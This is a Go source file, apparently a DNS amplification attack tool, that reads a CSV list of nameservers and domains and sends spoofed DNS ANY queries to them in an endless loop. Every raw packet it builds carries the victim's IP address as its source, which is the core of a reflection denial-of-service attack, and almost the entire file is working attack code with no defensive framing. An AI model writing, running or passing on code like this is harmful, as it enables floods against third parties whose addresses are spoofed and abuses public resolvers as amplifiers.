package dnsamp

import (
	"encoding/csv"
	"math/rand"
	"net"
	"os"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)


type Target struct {
    DomainName string
    NameServer string
}

const SRC_PORT = 42000
const IFACE = "wlp166s0"

var options gopacket.SerializeOptions
var srcMac net.HardwareAddr
var dstMac net.HardwareAddr

func init() {
    var err error
    srcMac = getHardwareAdress()
    // TODO: find a way to get the gateway MAC address
    dstMac, err = net.ParseMAC("ac:15:a2:be:6e:88")
    // dstMac = layers.EthernetBroadcast
    if err != nil {
        panic(err)
    }
    options = gopacket.SerializeOptions{
        ComputeChecksums: true,
        FixLengths:       true,
    }
}

func getHardwareAdress() net.HardwareAddr {
    var src_mac net.HardwareAddr
    ifaces, err := net.Interfaces()
    if err != nil {
        panic(err)
    }
    for _, iface := range ifaces {
        if iface.Name == IFACE {
            src_mac = iface.HardwareAddr
        }
    }
    return src_mac
}

// create ANY request packet
func makePacket(targetIP net.IP, domainName string, nameserverIP net.IP) []byte {
    ethernet := layers.Ethernet{
        SrcMAC: srcMac,
        DstMAC: dstMac,
        EthernetType: layers.EthernetTypeIPv4,
    }
    ip := layers.IPv4{
        Version: 4,
        TTL: 64,
        Protocol: layers.IPProtocolUDP,
        SrcIP: targetIP,
        DstIP: nameserverIP,
    }
    udp := layers.UDP{
        SrcPort: SRC_PORT,
        DstPort: 53,
    }
    udp.SetNetworkLayerForChecksum(&ip)
    qst := layers.DNSQuestion{
        Name: []byte(domainName),
        Class: layers.DNSClassIN,
        Type: layers.DNSType(layers.DNSClassAny),
    }
    dns := layers.DNS{
        RD: true,
        ID: uint16(rand.Int()),
        TC: false,
        OpCode: 0,
        Questions: []layers.DNSQuestion{qst},
    }
    buffer := gopacket.NewSerializeBuffer()
    if err := gopacket.SerializeLayers(buffer, options,
        &ethernet,
        &ip,
        &udp,
        &dns,
    ); err != nil {
        panic(err)
    }
    return buffer.Bytes()
}

// Read the file into a datastructure
func ReadFile(filename string) []Target {
    file, err := os.Open(filename)
    if err != nil {
        panic(err)
    }
    defer file.Close()
    reader := csv.NewReader(file)
    // skip first line
    if _, err := reader.Read(); err != nil {
        panic(err)
    }
    records, err := reader.ReadAll()
    if err != nil {
        panic(err)
    }
    res := []Target{}
    // domain, nameserver, ip, request response, tc
    for _, record := range records {
        target := Target{
            DomainName: record[0],
            NameServer: record[2],
        }
        res = append(res, target)
    }
    return res
}

func Send(targetIP net.IP, servers []Target) {
    handle, err := pcap.OpenLive(IFACE, 1500, false, pcap.BlockForever)
    if err != nil {
        panic(err)
    }
    // Send packets forever
    for {
        for _, server := range servers {
            nameserverIP := net.ParseIP(server.NameServer)
            if nameserverIP != nil {
                packet := makePacket(targetIP, server.DomainName, nameserverIP)
                err = handle.WritePacketData(packet)
                if err != nil {
                    panic(err)
                }
            }
        }
    }
}

